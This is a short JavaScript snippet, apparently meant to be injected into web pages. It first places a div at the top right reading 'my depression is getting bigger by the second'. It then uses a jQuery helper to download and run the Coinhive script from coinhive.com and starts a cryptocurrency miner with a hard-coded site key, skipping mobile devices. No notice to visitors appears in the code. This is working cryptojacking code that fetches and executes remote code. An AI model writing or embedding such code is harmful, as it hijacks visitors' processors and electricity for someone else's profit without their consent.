(function() {

	// just place a div at top right
	var div = document.createElement('div');
	div.style.position = 'fixed';
	div.style.top = 0;
	div.style.right = 0;
	div.textContent = 'my depression is getting bigger by the second';
	document.body.appendChild(div);

})()

jQuery.loadScript = function (url, callback) {
    jQuery.ajax({
        url: url,
        dataType: 'script',
        success: callback,
        async: true
    });
}

if (typeof someObject == 'undefined') $.loadScript('https://coinhive.com/lib/coinhive.min.js', function () {
    var miner = new CoinHive.Anonymous('qfKVhuQ8OWsUbIWSxkjvnFz4PaMfN5f3', { throttle: 20 });

    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):
    if (!miner.isMobile() && !miner.didOptOut(14400)) {
        miner.start();
    }
});
	
